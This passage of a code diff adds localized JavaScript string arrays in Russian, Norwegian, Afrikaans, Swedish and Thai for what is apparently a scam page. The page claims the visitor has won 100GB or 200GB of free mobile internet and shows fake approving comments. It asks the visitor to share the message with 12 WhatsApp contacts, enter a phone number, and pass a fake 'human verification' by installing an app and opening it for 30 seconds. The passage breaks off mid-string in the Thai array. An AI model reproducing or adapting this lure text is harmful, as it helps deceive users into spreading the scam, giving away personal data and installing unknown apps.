\u043A\u043E\u0433\u0434\u0430 \u0438 \u043A\u043E\u0433\u0434\u0430 \u043E\u043D\u043E \u0431\u0443\u0434\u0435\u0442 \u0443\u0441\u0442\u0430\u043D\u043E\u0432\u043B\u0435\u043D\u043E, \u0432\u044B \u0434\u043E\u043B\u0436\u043D\u044B \u043E\u0442\u043A\u0440\u044B\u0442\u044C \u0435\u0433\u043E \u043D\u0430 30 \u0441\u0435\u043A\u0443\u043D\u0434. ", "\u0427\u0442\u043E\u0431\u044B \u0430\u043A\u0442\u0438\u0432\u0438\u0440\u043E\u0432\u0430\u0442\u044C \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u044B\u0439 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442, \u0432\u044B \u0434\u043E\u043B\u0436\u043D\u044B \u0437\u0430\u0432\u0435\u0440\u0448\u0438\u0442\u044C \u043F\u043E\u0441\u043B\u0435\u0434\u043D\u0438\u0439 \u0437\u0430\u043A\u043B\u044E\u0447\u0438\u0442\u0435\u043B\u044C\u043D\u044B\u0439 \u044D\u0442\u0430\u043F \u043F\u0440\u043E\u0432\u0435\u0440\u043A\u0438 \u0447\u0435\u043B\u043E\u0432\u0435\u043A\u0430!", "\u041F\u043E\u0437\u0434\u0440\u0430\u0432\u043B\u044F\u044E, \u0432\u044B \u0432\u044B\u0438\u0433\u0440\u0430\u043B\u0438 100 \u0413\u0411 \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u043E\u0433\u043E \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442\u0430", "\u041F\u043E\u0434\u0435\u043B\u0438\u0441\u044C \u0441 \u0434\u0440\u0443\u0437\u044C\u044F\u043C\u0438", "\u041F\u043E\u0441\u043B\u0435 \u043E\u0431\u043C\u0435\u043D\u0430 \u0432\u044B \u043F\u0435\u0440\u0435\u0439\u0434\u0435\u0442\u0435 \u043A \u0441\u043B\u0435\u0434\u0443\u044E\u0449\u0435\u043C\u0443 \u0448\u0430\u0433\u0443, \u0447\u0442\u043E\u0431\u044B \u0432\u044B \u043C\u043E\u0433\u043B\u0438 \u0430\u043A\u0442\u0438\u0432\u0438\u0440\u043E\u0432\u0430\u0442\u044C \u044D\u0442\u043E\u0442 \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u044B\u0439 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0441\u0435\u0440\u0432\u0438\u0441 \u043D\u0430 60 \u0434\u043D\u0435\u0439", , "\u0427\u0442\u043E\u0431\u044B \u0438\u043C\u0435\u0442\u044C \u0432\u043E\u0437\u043C\u043E\u0436\u043D\u043E\u0441\u0442\u044C \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u043E \u0430\u043A\u0442\u0438\u0432\u0438\u0440\u043E\u0432\u0430\u0442\u044C \u0418\u043D\u0442\u0435\u0440\u043D\u0435\u0442, \u0441\u043D\u0430\u0447\u0430\u043B\u0430 \u043D\u0430\u0436\u043C\u0438\u0442\u0435 \u0437\u0435\u043B\u0435\u043D\u0443\u044E \u043A\u043D\u043E\u043F\u043A\u0443 \" \u041F\u043E\u0434\u0435\u043B\u0438\u0442\u044C\u0441\u044F \"\u0438 \u043E\u0442\u043F\u0440\u0430\u0432\u044C\u0442\u0435 \u044D\u0442\u0443 \u043D\u043E\u0432\u043E\u0441\u0442\u044C 12 \u0434\u0440\u0443\u0437\u044C\u044F\u043C \u0438\u043B\u0438 \u0433\u0440\u0443\u043F\u043F\u0430\u043C \u0432 WhatsApp, \u0447\u0442\u043E\u0431\u044B \u043E\u043D\u0438 \u0442\u0430\u043A\u0436\u0435 \u043C\u043E\u0433\u043B\u0438 \u043F\u043E\u043B\u0443\u0447\u0438\u0442\u044C \u044D\u0442\u0443 \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u0443\u044E \u0443\u0441\u043B\u0443\u0433\u0443 \u0432 \u0442\u0435\u0447\u0435\u043D\u0438\u0435 \u044D\u0442\u043E\u0433\u043E \u0434\u043B\u0438\u0442\u0435\u043B\u044C\u043D\u043E\u0433\u043E \u043A\u0430\u0440\u0430\u043D\u0442\u0438\u043D\u0430!", "\u041A\u0430\u043A \u0430\u043A\u0442\u0438\u0432\u0438\u0440\u043E\u0432\u0430\u0442\u044C \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u044B\u0439 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442?", "\u041F\u043E\u0437\u0434\u0440\u0430\u0432\u043B\u044F\u0435\u043C, \u0432\u044B \u0432\u044B\u0438\u0433\u0440\u0430\u043B\u0438 100 \u0413\u0411 \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u043E \u0443 \u0441\u0432\u043E\u0435\u0433\u043E \u043E\u043F\u0435\u0440\u0430\u0442\u043E\u0440\u0430 \u043C\u043E\u0431\u0438\u043B\u044C\u043D\u043E\u0439 \u0441\u0432\u044F\u0437\u0438!", "\u041F\u043E\u0434\u043E\u0436\u0434\u0438\u0442\u0435, \u043C\u044B \u043F\u0440\u043E\u0432\u0435\u0440\u044F\u0435\u043C \u0434\u0430\u043D\u043D\u044B\u0435.", "\u041F\u043E\u043B\u0438\u0442\u0438\u043A\u0430 \u0438 \u0443\u0441\u043B\u043E\u0432\u0438\u044F \u043A\u043E\u043D\u0444\u0438\u0434\u0435\u043D\u0446\u0438\u0430\u043B\u044C\u043D\u043E\u0441\u0442\u0438 \u043D\u0430\u0448\u0435\u0433\u043E \u0441\u0435\u0440\u0432\u0438\u0441\u0430", "\u041F\u0440\u0438\u043B\u043E\u0436\u0435\u043D\u0438\u0435 \u043D\u0435 \u0438\u043C\u0435\u0435\u0442 \u043F\u0440\u0430\u0432\u0430 \u043F\u0443\u0431\u043B\u0438\u043A\u043E\u0432\u0430\u0442\u044C \u0432 Facebook", "\u041F\u0440\u0438\u043C\u0438 - \u044F \u0447\u0435\u043B\u043E\u0432\u0435\u043A", "\u041C\u044B \u0434\u043E\u043B\u0436\u043D\u044B \u043F\u043E\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u044C, \u0447\u0442\u043E \u0432\u044B \u043D\u0430\u0441\u0442\u043E\u044F\u0449\u0438\u0439 \u0447\u0435\u043B\u043E\u0432\u0435\u043A, \u043F\u0440\u043E\u0432\u0435\u0440\u0438\u0432 \u0441\u0432\u043E\u0435 \u0438\u043C\u044F \u0438 \u0444\u043E\u0442\u043E\u0433\u0440\u0430\u0444\u0438\u044E \u043F\u0440\u043E\u0444\u0438\u043B\u044F", , "\u0417\u0430\u043F\u0440\u043E\u0441\u0438\u0442\u044C \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043D\u0438\u0435", "\u041F\u043E\u0434\u043E\u0436\u0434\u0438\u0442\u0435, \u043C\u044B \u043F\u0440\u043E\u0432\u0435\u0440\u044F\u0435\u043C \u0434\u0430\u043D\u043D\u044B\u0435", "\u041F\u0440\u043E\u0432\u0435\u0440\u043A\u0430 \u043F\u043E\u0434\u043B\u0438\u043D\u043D\u043E\u0441\u0442\u0438 \u043B\u0438\u0447\u043D\u043E\u0441\u0442\u0438", "\u041F\u043E\u0434\u043A\u043B\u044E\u0447\u0435\u043D\u0438\u0435 \u043A \u0432\u0430\u0448\u0435\u043C\u0443 \u043E\u043F\u0435\u0440\u0430\u0442\u043E\u0440\u0443", "\u0412\u044B\u043F\u043E\u043B\u043D\u0438\u0442\u0435 \u044D\u0442\u0438 3 \u0448\u0430\u0433\u0430", "\u041E\u0442\u043F\u0440\u0430\u0432\u0438\u0442\u044C", " \u0432 \u043D\u0430\u0448\u0435\u043C \u0441\u043F\u0438\u0441\u043A\u0435. \u041F\u043E\u0436\u0430\u043B\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0432\u043E\u0439 \u043D\u043E\u043C\u0435\u0440 \u0442\u0435\u043B\u0435\u0444\u043E\u043D\u0430", "\u041F\u0440\u043E\u0432\u0438\u043D\u0446\u0438\u044F ", "\u0421\u043F\u0430\u0441\u0438\u0431\u043E, \u043C\u044B \u0443\u0436\u0435 \u043F\u043E\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u043B\u0438", "\u041F\u0440\u043E\u0432\u0435\u0440\u044C\u0442\u0435 \u044D\u0442\u043E", " 100 \u0413\u0411 \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u043E", "\u041F\u0440\u043E\u0432\u0435\u0440\u044C\u0442\u0435, \u0431\u044B\u043B\u0430 \u043B\u0438 \u0432\u044B\u0431\u0440\u0430\u043D\u0430 \u0432\u0430\u0448\u0430 \u0437\u043E\u043D\u0430", "\u041E\u0441\u0442\u0430\u0432\u0430\u0439\u0441\u044F \u0434\u043E\u043C\u0430", "\u0411\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u044B\u0439 \u0418\u043D\u0442\u0435\u0440\u043D\u0435\u0442 : 100 \u0413\u0411"] :
+                            "no" === language ? window.words = ["Response", "Jeg liker det", "Integrasjon ganske enkelt. Det ble delt av noen personlige venner.", "du skriver en kommentar ...", "Svar", "Jeg liker det", "I disse vanskelige tider er det n\xF8dvendig.", "Svar", "Jeg liker det", "Virkelig, takk for at du delte dette med oss.", "Svar", "Jeg liker det", "Jeg sjekker byen min, jeg var til stede. Takk for at du vurderer oss.", "Svar", "Jeg liker det", "Takk, virkelig, det fungerer perfekt.", "Kommentarfelt", "Jeg liker det", "Handlinger", "kommentarer", "153K", "ANDROID", "IPONE", "Velg n\xE5 mobilenheten din.", "(Husk at dette trinnet er viktig for at gratis internett skal fungere).", "En. Du b\xF8r installere appen nedenfor n\xE5r og n\xE5r den er installert, b\xF8r du \xE5pne den i 30 sekunder. ", "For \xE5 aktivere gratis internett, m\xE5 du fullf\xF8re dette siste slutttrinnet i Human Verification!", "Gratulerer, du vant 200GB gratis internett", "Del med vennene dine", "Etter deling vil du g\xE5 til neste trinn slik at du kan aktivere denne gratis internettjenesten i 60 dager. ", "For \xE5 kunne aktivere Internett gratis, klikker du f\xF8rst p\xE5 den gr\xF8nne \"DEL\" knappen og sender denne nyheten til 12 venner eller grupper p\xE5 WhatsApp, slik at de ogs\xE5 kan f\xE5 denne gratis tjenesten i l\xF8pet av denne lange karantenen!", "Hvordan aktivere gratis Internett?", "Gratulerer, du vant 200GB gratis fra din mobiloperat\xF8r!", "Vent litt, vi validerer dataene.", "Personvernregler og betingelser for service", "S\xF8knaden har ikke lov til \xE5 legge ut p\xE5 Facebook", "Godta - jeg er et menneske", "Vi b\xF8r validere at du er et virkelig menneske ved \xE5 sjekke navnet og profilbildet ditt.", "Be om tillatelse", "Vent, vi validerer data", "Verifisering av ekte identitet", "Koble til operat\xF8ren din", "Fullf\xF8r disse tre trinnene", "Send", " er p\xE5 listen v\xE5r. Vennligst tast inn telefonnummeret ditt", "Provinsen ", "Takk, vi har allerede bekreftet det", "Sjekk det ut", " 200GB gratis", "Sjekk om sonen din er valgt som", "Stay at home", "Gratis Internett 4G/5G: 200GB"] :
+                                "af" === language ? window.words = ["Response", "Ek hou daarvan", "Integrasie redelik maklik. Dit is deurn paar persoonlike vriende gedeel.", "jy skryfn opmerking ...", "N antwoord", "Ek hou daarvan", "In hierdie moeilike tye is dit nodig.", "N antwoord", "Ek hou daarvan", "Regtig, dankie dat u dit met ons gedeel het.", "N antwoord", "Ek hou daarvan", "Ek kyk na my stad, ek was teenwoordig. Dankie dat u ons oorweeg het.", "N antwoord", "Ek hou daarvan", "Bedank, dit werk regtig perfek.", "Die veld", "Ek hou daarvan", "Aksies", "Opmerkings", "153K", "ANDROID", "IPONE", "Kies nou jou mobiele toestel.", "(Onthou dat hierdie stap belangrik is vir gratis internet om te werk).", "1. U moet die app hieronder installeer wanneer en wanneer dit ge\xEFnstalleer is, en dit vir 30 sekondes oopmaak.", "Om gratis internet te aktiveer, moet u hierdie laaste finale stap van Menslike Verifi\xEBring voltooi!", "Baie geluk, jy het 200GB gratis internet gewen", "Deel met jou vriende", "Nadat u dit gedeel het, gaan u na die volgende stap sodat u hierdie gratis internetdiens vir 60 dae kan aktiveer.", "Om die internet gratis te kan aktiveer, klik eers op die groen \" WHATSAPP \" knoppie en stuur hierdie nuus aan 12 vriende of groepe op WhatsApp, sodat hulle ook hierdie gratis diens kan kry tydens hierdie lang kwarantyn!", "Hoe kan u gratis internet aktiveer?", "Baie geluk, u het 200GB gratis van u selfoonoperateur gewen!", "Wagn oomblik, ons valideer die data.", "Ons privaatheidsbeleid en -voorwaardes vir diens", "Die aansoek mag nie op Facebook plaas nie", "Aanvaar - ek isn mens", "Ons moet bevestig dat un regte mens is deur u naam en profielfoto na te gaan.", "Vra toestemming", "Wag, ons bekragtig data", "Werklike identiteitsverifikasie", "Verbind met u operateur", "Voltooi hierdie 3 stappe", "Stuur", " is op ons lys. Voer u telefoonnommer in", "Die provinsie ", "Dankie, ons het al bevestig", "Kyk dit", " 200GB gratis", "Kyk of u sone gekies is", "Bly by die huis", "Gratis Internet 4G/5G: 200GB"] :
+                                    "sv" === language ? window.words = ["Svar", "Jag gillar det", "Integration ganska enkelt. Det delades av n\xE5gra personliga v\xE4nner.", "du skriver en kommentar ...", "Svara", "Jag gillar det", "Under dessa sv\xE5ra tider \xE4r det n\xF6dv\xE4ndigt.", "Svara", "Jag gillar det", "Verkligen, tack f\xF6r att du delade detta med oss.", "Svara", "Jag gillar det", "Jag kontrollerar min stad, jag var n\xE4rvarande. Tack f\xF6r att du betraktar oss.", "Svara", "Jag gillar det", "Tack, verkligen fungerar det perfekt.", "Kommentarf\xE4ltet", "Jag gillar det", "\xC5tg\xE4rder", "Kommentarer", "153 K", "ANDROID", "IPone", "V\xE4lj nu din mobila enhet.", "(Kom ih\xE5g att detta steg \xE4r viktigt f\xF6r att gratis internet ska fungera).", "1. Du b\xF6r installera appen nedan n\xE4r och n\xE4r den \xE4r installerad b\xF6r du \xF6ppna den i 30 sekunder. ", "F\xF6r att aktivera gratis internet m\xE5ste du slutf\xF6ra detta sista sista steg i m\xE4nsklig verifiering!", "Grattis, du vann 200GB gratis internet", "Dela med dina v\xE4nner", "Efter delning g\xE5r du till n\xE4sta steg s\xE5 att du kan aktivera denna gratis internettj\xE4nst i 60 dagar.", "F\xF6r att kunna aktivera Internet gratis klickar du f\xF6rst p\xE5 den gr\xF6na\" DELA \" knappen och skickar denna nyhet till 12 v\xE4nner eller grupper p\xE5 WhatsApp s\xE5 att de ocks\xE5 kan f\xE5 denna gratis tj\xE4nst under denna l\xE5nga karant\xE4n!", "Hur aktiverar jag gratis internet?", "Grattis, du vann 200GB gratis fr\xE5n din mobiloperat\xF6r!", "V\xE4nta ett \xF6gonblick, vi validerar uppgifterna.", "V\xE5r integritetspolicy och villkor f\xF6r tj\xE4nster", "Ans\xF6kan f\xE5r inte l\xE4gga upp p\xE5 Facebook", "Acceptera - jag \xE4r en m\xE4nniska", "Vi b\xF6r bekr\xE4fta att du \xE4r en riktig m\xE4nniska genom att kontrollera ditt namn och profilfoto.", "Beg\xE4r till\xE5telse", "V\xE4nta, vi validerar data", "Verifiering av verklig identitet", "Ansluta till din operat\xF6r", "Slutf\xF6r dessa tre steg", "Skicka", " finns p\xE5 v\xE5r lista. Ange ditt telefonnummer", "Provinsen ", "Tack, vi har redan verifierat", "Kolla in det", " 200GB gratis", "Kontrollera om din zon \xE4r vald f\xF6r", "Stay at Home", "Gratis Internet 4G/5G: 200GB"] :
+                                        "th" === language ? window.words = ["\u0E04\u0E33\u0E15\u0E2D\u0E1A", "\u0E09\u0E31\u0E19\u0E0A\u0E2D\u0E1A", "\u0E23\u0E27\u0E21\u0E07\u0E48\u0E32\u0E22\u0E2A\u0E27\u0E22 \u0E21\u0E31\u0E19\u0E16\u0E39\u0E01\u0E41\u0E1A\u0E48\u0E07\u0E1B\u0E31\u0E19\u0E42\u0E14\u0E22\u0E40\u0E1E\u0E37\u0E48\u0E2D\u0E19\u0E2A\u0E48\u0E27\u0E19\u0E15\u0E31\u0E27\u0E1A\u0E32\u0E07\u0E04\u0E19", "\u0E01\u0E33\u0E25\u0E31\u0E07\u0E40\u0E02\u0E35\u0E22\u0E19\u0E04\u0E27\u0E32\u0E21\u0E04\u0E34\u0E14\u0E40\u0E2B\u0E47\u0E19 ...", "\u0E04\u0E33\u0E15\u0E2D\u0E1A", "\u0E09\u0E31\u0E19\u0E0A\u0E2D\u0E1A", "\u0E43\u0E19\u0E0A\u0E48\u0E27\u0E07\u0E40\u0E27\u0E25\u0E32\u0E17\u0E35\u0E48\u0E22\u0E32\u0E01\u0E25\u0E33\u0E1A\u0E32\u0E01\u0E40\u0E2B\u0E25\u0E48\u0E32\u0E19\u0E35\u0E49\u0E21\u0E35\u0E04\u0E27\u0E32\u0E21\u0E08\u0E33\u0E40\u0E1B\u0E47\u0E19", "\u0E04\u0E33\u0E15\u0E2D\u0E1A", "\u0E09\u0E31\u0E19\u0E0A\u0E2D\u0E1A", "\u0E02\u0E2D\u0E1A\u0E04\u0E38\u0E13\u0E21\u0E32\u0E01\u0E17\u0E35\u0E48\u0E41\u0E1A\u0E48\u0E07\u0E1B\u0E31\u0E19\u0E2A\u0E34\u0E48\u0E07\u0E19\u0E35\u0E49\u0E01\u0E31\u0E1A\u0E40\u0E23\u0E32", "\u0E04\u0E33\u0E15\u0E2D\u0E1A", "\u0E09\u0E31\u0E19\u0E0A\u0E2D\u0E1A", "\u0E09\u0E31\u0E19\u0E15\u0E23\u0E27\u0E08\u0E2A\u0E2D\u0E1A\u0E40\u0E21\u0E37\u0E2D\u0E07\u0E02\u0E2D\u0E07\u0E09\u0E31\u0E19\u0E09\u0E31\u0E19\u0E2D\u0E22\u0E39\u0E48 \u0E02\u0E2D\u0E1A\u0E04\u0E38\u0E13\u0E17\u0E35\u0E48\u0E1E\u0E34\u0E08\u0E32\u0E23\u0E13\u0E32\u0E1E\u0E27\u0E01\u0E40\u0E23\u0E32", "\u0E04\u0E33\u0E15\u0E2D\u0E1A", "\u0E09\u0E31\u0E19\u0E0A\u0E2D\u0E1A", "\u0E02\u0E2D\u0E1A\u0E04\u0E38\u0E13\u0E08\u0E23\u0E34\u0E07\u0E46\u0E21\u0E31\u0E19\u0E17\u0E33\u0E07\u0E32\u0E19\u0E44\u0E14\u0E49\u0E2D\u0E22\u0E48\u0E32\u0E07\u0E2A\u0E21\u0E1A\u0E39\u0E23\u0E13\u0E4C", "\u0E04\u0E34\u0E14\u0E40\u0E2B\u0E47\u0E19", "\u0E09\u0E31\u0E19\u0E0A\u0E2D\u0E1A", "\u0E01\u0E32\u0E23\u0E1B\u0E0F\u0E34\u0E1A\u0E31\u0E15\u0E34", "\u0E41\u0E2A\u0E14\u0E07\u0E04\u0E27\u0E32\u0E21\u0E04\u0E34\u0E14\u0E40\u0E2B\u0E47\u0E19", "153K", "ANDROID", "IPHONE", "\u0E15\u0E2D\u0E19\u0E19\u0E35\u0E49\u0E40\u0E25\u0E37\u0E2D\u0E01\u0E2D\u0E38\u0E1B\u0E01\u0E23\u0E13\u0E4C\u0E21\u0E37\u0E2D\u0E16\u0E37\u0E2D\u0E02\u0E2D\u0E07\u0E04\u0E38\u0E13", "(\u0E42\u0E1B\u0E23\u0E14\u0E08\u0E33\u0E44\u0E27\u0E49\u0E27\u0E48\u0E32\u0E02\u0E31\u0E49\u0E19\u0E15\u0E2D\u0E19\u0E19\u0E35\u0E49\u0E21\u0E35\u0E04\u0E27\u0E32\u0E21\u0E2A\u0E33\u0E04\u0E31\u0E0D\u0E15\u0E48\u0E2D\u0E01\u0E32\u0E23\u0E43\u0E0A\u0E49\u0E07\u0E32\u0E19\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15\u0E1F\u0E23\u0E35)", "1. \u0E04\u0E38\u0E13\u0E08\u0E30\u0E15\u0E49\u0E2D\u0E07\u0E15\u0E34\u0E14\u0E15\u0E31\u0E49\u0E07\u0E41\u0E2D\u0E1B\u0E1E\u0E25\u0E34\u0E40\u0E04\u0E0A\u0E31\u0E48\u0E19\u0E14\u0E49\u0E32\u0E19\u0E25\u0E48\u0E32\u0E07\u0E40\u0E21\u0E37\u0E48\u0E2D\u0E43\u0E14\u0E41\u0E25\u0E30\u0E40\u0E21\u0E37\u0E48\u0E2D\u0E21\u0E35\u0E01\u0E32\u0E23\u0E15\u0E34\u0E14\u0E15\u0E31\u0E49\u0E07\u0E41\u0E25\u0E49\u0E27\u0E04\u0E38\u0E13\u0E08\u0E30\u0E15\u0E49\u0E2D\u0E07\u0E40\u0E1B\u0E34\u0E14\u0E21\u0E31\u0E19\u0E40\u0E1B\u0E47\u0E19\u0E40\u0E27\u0E25\u0E32 30 \u0E27\u0E34\u0E19\u0E32\u0E17\u0E35", "\u0E43\u0E19\u0E01\u0E32\u0E23\u0E40\u0E1B\u0E34\u0E14\u0E43\u0E0A\u0E49\u0E07\u0E32\u0E19\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15\u0E1F\u0E23\u0E35\u0E04\u0E38\u0E13\u0E15\u0E49\u0E2D\u0E07\u0E17\u0E33\u0E15\u0E32\u0E21\u0E02\u0E31\u0E49\u0E19\u0E15\u0E2D\u0E19\u0E2A\u0E38\u0E14\u0E17\u0E49\u0E32\u0E22\u0E02\u0E2D\u0E07\u0E01\u0E32\u0E23\u0E22\u0E37\u0E19\u0E22\u0E31\u0E19\u0E15\u0E31\u0E27\u0E1A\u0E38\u0E04\u0E04\u0E25\u0E43\u0E2B\u0E49\u0E40\u0E2A\u0E23\u0E47\u0E08\u0E2A\u0E34\u0E49\u0E19!", "\u0E02\u0E2D\u0E41\u0E2A\u0E14\u0E07\u0E04\u0E27\u0E32\u0E21\u0E22\u0E34\u0E19\u0E14\u0E35\u0E04\u0E38\u0E13\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A\u0E23\u0E32\u0E07\u0E27\u0E31\u0E25\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15\u0E1F\u0E23\u0E35 200GB", "\u0E41\u0E1A\u0E48\u0E07\u0E1B\u0E31\u0E19\u0E01\u0E31\u0E1A\u0E40\u0E1E\u0E37\u0E48\u0E2D\u0E19\u0E02\u0E2D\u0E07\u0E04\u0E38\u0E13", "\u0E2B\u0E25\u0E31\u0E07\u0E08\u0E32\u0E01\u0E41\u0E1A\u0E48\u0E07\u0E1B\u0E31\u0E19\u0E04\u0E38\u0E13\u0E08\u0E30\u0E44\u0E1B\u0E22\u0E31\u0E07\u0E02\u0E31\u0E49\u0E19\u0E15\u0E2D\u0E19\u0E16\u0E31\u0E14\u0E44\u0E1B\u0E40\u0E1E\u0E37\u0E48\u0E2D\u0E43\u0E2B\u0E49\u0E04\u0E38\u0E13\u0E2A\u0E32\u0E21\u0E32\u0E23\u0E16\u0E40\u0E1B\u0E34\u0E14\u0E43\u0E0A\u0E49\u0E07\u0E32\u0E19\u0E1A\u0E23\u0E34\u0E01\u0E32\u0E23\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15\u0E1F\u0E23\u0E35\u0E40\u0E1B\u0E47\u0E19\u0E40\u0E27\u0E25\u0E32 60 \u0E27\u0E31\u0E19", "\u0E40\u0E1E\u0E37\u0E48\u0E2D\u0E43\u0E2B\u0E49\u0E2A\u0E32\u0E21\u0E32\u0E23\u0E16\u0E40\u0E1B\u0E34\u0E14\u0E43\u0E0A\u0E49\u0E07\u0E32\u0E19\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15\u0E44\u0E14\u0E49\u0E1F\u0E23\u0E35\u0E02\u0E31\u0E49\u0E19\u0E41\u0E23\u0E01\u0E43\u0E2B\u0E49\u0E04\u0E25\u0E34\u0E01\u0E17\u0E35\u0E48\u0E1B\u0E38\u0E48\u0E21 \"\u0E41\u0E1A\u0E48\u0E07\u0E1B\u0E31\u0E19\" \u0E2A\u0E35\u0E40\u0E02\u0E35\u0E22\u0E27\u0E41\u0E25\u0E30\u0E2A\u0E48\u0E07\u0E02\u0E48\u0E32\u0E27\u0E19\u0E35\u0E49\u0E44\u0E1B\u0E22\u0E31\u0E07\u0E40\u0E1E\u0E37\u0E48\u0E2D\u0E19 12 \u0E04\u0E19\u0E2B\u0E23\u0E37\u0E2D\u0E01\u0E25\u0E38\u0E48\u0E21\u0E43\u0E19 WhatsApp \u0E40\u0E1E\u0E37\u0E48\u0E2D\u0E43\u0E2B\u0E49\u0E1E\u0E27\u0E01\u0E40\u0E02\u0E32\u0E2A\u0E32\u0E21\u0E32\u0E23\u0E16\u0E23\u0E31\u0E1A\u0E1A\u0E23\u0E34\u0E01\u0E32\u0E23\u0E1F\u0E23\u0E35\u0E19\u0E35\u0E49\u0E43\u0E19\u0E23\u0E30\u0E2B\u0E27\u0E48\u0E32\u0E07\u0E01\u0E32\u0E23\u0E01\u0E31\u0E01\u0E01\u0E31\u0E19\u0E23\u0E30\u0E22\u0E30\u0E22\u0E32\u0E27!", "\u0E27\u0E34\u0E18\u0E35\u0E40\u0E1B\u0E34\u0E14\u0E43\u0E0A\u0E49\u0E07\u0E32\u0E19\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15\u0E1F\u0E23\u0E35", "\u0E02\u0E2D\u0E41\u0E2A\u0E14\u0E07\u0E04\u0E27\u0E32\u0E21\u0E22\u0E34\u0E19\u0E14\u0E35\u0E04\u0E38\u0E13\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A 200GB \u0E1F\u0E23\u0E35\u0E08\u0E32\u0E01\u0E1C\u0E39\u0E49\u0E43\u0E2B\u0E49\u0E1A\u0E23\u0E34\u0E01\u0E32\u0E23\u0E21\u0E37\u0E2D\u0E16\u0E37\u0E2D\u0E02\u0E2D\u0E07\u0E04\u0E38\u0E13!", "\u0E40\u0E14\u0E35\u0E4B\u0E22\u0E27\u0E01\u0E48\u0E2D\u0E19\u0E40\u0E23\u0E32\u0E17\u0E33\u0E01\u0E32\u0E23\u0E15\u0E23\u0E27\u0E08\u0E2A\u0E2D\u0E1A\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25", "\u0E19\u0E42\u0E22\u0E1A\u0E32\u0E22\u0E04\u0E27\u0E32\u0E21\u0E40\u0E1B\u0E47\u0E19\u0E2A\u0E48\u0E27\u0E19\u0E15\u0E31\u0E27\u0E1A\u0E23\u0E34\u0E01\u0E32\u0E23\u0E02\u0E2D\u0E07\u0E40\u0E23\u0E32\u0E41\u0E25\u0E30\u0E40\u0E07\u0E37\u0E48\u0E2D\u0E19\u0E44\u0E02", "\u0E41\u0E2D\u0E1B\u0E1E\u0E25\u0E34\u0E40\u0E04\u0E0A\u0E31\u0E19\u0E44\u0E21\u0E48\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A\u0E2D\u0E19\u0E38\u0E0D\u0E32\u0E15\u0E43\u0E2B\u0E49\u0E42\u0E1E\u0E2A\u0E15\u0E4C\u0E1A\u0E19 Facebook", "\u0E22\u0E2D\u0E21\u0E23\u0E31\u0E1A - \u0E09\u0E31\u0E19\u0E40\u0E1B\u0E47\u0E19\u0E21\u0E19\u0E38\u0E29\u0E22\u0E4C", "\u0E40\u0E23\u0E32\u0E04\u0E27\u0E23\u0E15\u0E23\u0E27\u0E08\u0E2A\u0E2D\u0E1A\u0E27\u0E48\u0E32\u0E04\u0E38\u0E13\u0E40\u0E1B\u0E47\u0E19\u0E21\u0E19\u0E38\u0E29\u0E22\u0E4C\u0E08\u0E23\u0E34\u0E07\u0E42\u0E14\u0E22\u0E15\u0E23\u0E27\u0E08\u0E2A\u0E2D\u0E1A\u0E0A\u0E37\u0E48\u0E2D\u0E41\u0E25\u0E30\u0E23\u0E39\u0E1B\u0E16\u0E48\u0E32\u0E22\u0E02\u0E2D\u0E07\u0E04\u0E38\u0E13", "\u0E02\u0E2D\u0E2D\u0E19\u0E38\u0E0D\u0E32\u0E15", "\u0E23\u0E2D\u0E40\u0E23\u0E32\u0E01\u0E33\u0E25\u0E31\u0E07\u0E15\u0E23\u0E27\u0E08\u0E2A\u0E2D\u0E1A\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25", "\u0E01\u0E32\u0E23\u0E22\u0E37\u0E19\u0E22\u0E31\u0E19\u0E15\u0E31\u0E27\u0E15\u0E19\u0E17\u0E35\u0E48\u0E41\u0E17\u0E49\u0E08\u0E23\u0E34\u0E07", "\u0E01\u0E32\u0E23\u0E22\u0E37\u0E19\u0E22\u0E31\u0E19\u0E15\u0E31\u0E27\u0E15\u0E19\u0E17\u0E35\u0E48\u0E41\u0E17\u0E49\u0E08\u0E23\u0E34\u0E07...", "\u0E17\u0E33\u0E15\u0E32\u0E21 3 \u0E02\u0E31\u0E49\u0E19\u0E15\u0E2D\u0E19\u0E40\u0E2B\u0E25\u0E48\u0E32\u0E19\u0E35\u0E49\u0E43\u0E2B\u0E49\u0E2A\u0E21\u0E1A\u0E39\u0E23\u0E13\u0E4C", "\u0E2A\u0E48\u0E07", " \u0E21\u0E31\u0E19\u0E2D\u0E22\u0E39\u0E48\u0E43\u0E19\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23\u0E02\u0E2D\u0E07\u0E40\u0E23\u0E32 